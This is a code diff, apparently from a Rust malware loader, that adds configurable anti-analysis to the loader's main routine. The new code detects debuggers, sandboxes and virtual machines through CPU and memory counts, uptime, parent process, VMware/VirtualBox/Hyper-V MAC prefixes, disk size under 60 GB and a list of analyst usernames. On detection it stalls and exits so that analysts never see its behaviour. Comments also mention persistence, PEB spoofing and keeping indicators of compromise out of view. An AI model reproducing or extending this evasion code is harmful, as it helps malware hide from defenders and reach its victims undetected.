@@ -25,10 +25,14 @@ fn main() {
 
     // 2. Anti-analysis: sandbox + debugger detection (BEFORE any persistence/IOCs)
     //    Skip uptime check on boot to avoid self-kill on autostart
-    if is_sandbox(is_boot) || check_debugger() {
-        // In sandbox/debugger: execute benign behavior then exit cleanly
-        std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
-        std::process::exit(0);
+    if loader_cfg.anti_analysis.enabled {
+        if is_sandbox(&loader_cfg.anti_analysis, is_boot)
+            || (loader_cfg.anti_analysis.check_debugger && check_debugger())
+        {
+            // In sandbox/debugger: execute benign behavior then exit cleanly
+            std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
+            std::process::exit(0);
+        }
     }
 
     // 3. PEB spoofing — mask image path BEFORE any external calls
@@ -147,7 +151,7 @@ fn main() {
 
 // ── Config Injection ──────────────────────────────────────────────────
 
-use libra_common::models::{InjectedConfig, CONFIG_MAGIC};
+use libra_common::models::{AntiAnalysisConfig, InjectedConfig, CONFIG_MAGIC};
 
 fn parse_injected_config() -> Option<(InjectedConfig, String)> {
     let exe_path = env::current_exe().ok()?;
@@ -264,11 +268,14 @@ fn install_persistence() {
 
 // ── Anti-analysis (inline, no libra-modules dependency) ───────────────
 
-fn is_sandbox(skip_uptime: bool) -> bool {
-    check_cpu_cores()
-        || check_memory()
-        || (!skip_uptime && check_uptime())
-        || check_debugger()
+fn is_sandbox(cfg: &AntiAnalysisConfig, skip_uptime: bool) -> bool {
+    (cfg.check_cpu_cores && check_cpu_cores())
+        || (cfg.check_memory && check_memory())
+        || (cfg.check_uptime && !skip_uptime && check_uptime())
+        || (cfg.check_parent_process && check_parent_process_standalone())
+        || (cfg.check_vm_mac && check_vm_mac())
+        || (cfg.check_disk_size && check_disk_size())
+        || (cfg.check_username && check_username())
 }
 
 fn check_cpu_cores() -> bool {
@@ -302,12 +309,19 @@ fn check_debugger() -> bool {
             || check_nt_global_flag()
             || check_hardware_breakpoints()
             || check_remote_debugger()
-            || check_parent_process()
     }
     #[cfg(not(target_os = "windows"))]
     {
         check_ptrace_traceme() || check_tracer_pid()
     }
+}
+
+/// Standalone parent-process check (gated by `check_parent_process` config flag).
+fn check_parent_process_standalone() -> bool {
+    #[cfg(target_os = "windows")]
+    { check_parent_process() }
+    #[cfg(not(target_os = "windows"))]
+    { false }
 }
 
 /// PEB->BeingDebugged (byte at PEB+0x2): set to 1 when process is debugged.
@@ -506,6 +520,91 @@ fn check_ptrace_traceme() -> bool {
         // If we're already being traced, ptrace returns -1
         libc::ptrace(PTRACE_TRACEME, 0, 0, 0) == -1
     }
+}
+
+// ── VM / sandbox environment checks ───────────────────────────────────
+
+/// Check if any network adapter MAC prefix matches known VM vendors.
+/// VMware: 00:0C:29, 00:50:56 | VirtualBox: 08:00:27 | Hyper-V: 00:15:5D
+fn check_vm_mac() -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::process::CommandExt;
+        if let Ok(output) = std::process::Command::new("wmic")
+            .args(["nic", "where", "PhysicalAdapter=TRUE", "get", "MACAddress", "/format:csv"])
+            .creation_flags(0x08000000)
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::null())
+            .output()
+        {
+            let text = String::from_utf8_lossy(&output.stdout);
+            for line in text.lines().skip(2) {
+                if let Some(mac) = line.split(',').last() {
+                    let mac_clean = mac.trim().replace('-', ":").to_lowercase();
+                    if mac_clean.starts_with("00:0c:29")
+                        || mac_clean.starts_with("00:50:56")
+                        || mac_clean.starts_with("08:00:27")
+                        || mac_clean.starts_with("00:15:5d")
+                    {
+                        return true;
+                    }
+                }
+            }
+        }
+        false
+    }
+    #[cfg(target_os = "linux")]
+    {
+        if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
+            for entry in entries.flatten() {
+                let mac_path = entry.path().join("address");
+                if let Ok(mac) = std::fs::read_to_string(&mac_path) {
+                    let mac = mac.trim().to_lowercase();
+                    if mac.starts_with("00:0c:29")
+                        || mac.starts_with("00:50:56")
+                        || mac.starts_with("08:00:27")
+                        || mac.starts_with("00:15:5d")
+                    {
+                        return true;
+                    }
+                }
+            }
+        }
+        false
+    }
+    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
+    { false }
+}
+
+/// Check if the system disk is smaller than 60 GB (typical VM/sandbox).
+fn check_disk_size() -> bool {
+    use sysinfo::Disks;
+    let disks = Disks::new_with_refreshed_list();
+    let total: u64 = disks.iter().map(|d| d.total_space()).sum();
+    // 60 GB = 60 * 1024 * 1024 * 1024
+    total < 60 * 1024 * 1024 * 1024
+}
+
+/// Check if the current username matches known sandbox/analysis names.
+fn check_username() -> bool {
+    let username = std::env::var("USERNAME")
+        .or_else(|_| std::env::var("USER"))
+        .unwrap_or_default()
+        .to_lowercase();
+
+    const SUSPICIOUS_NAMES: &[&str] = &[
+        "admin", "administrator", "malware", "maltest", "sandbox",
+        "user", "test", "virus", "sample", "john", "abc",
+        "cuckoo", "cape", "vbox", "vmware", "honey",
+        "analyst", "analysis", "lab", "researcher",
+    ];
+
+    for name in SUSPICIOUS_NAMES {
+        if username == *name {
+            return true;
+        }
+    }
+    false
 }
 
 fn get_system_uptime_secs() -> u64 {
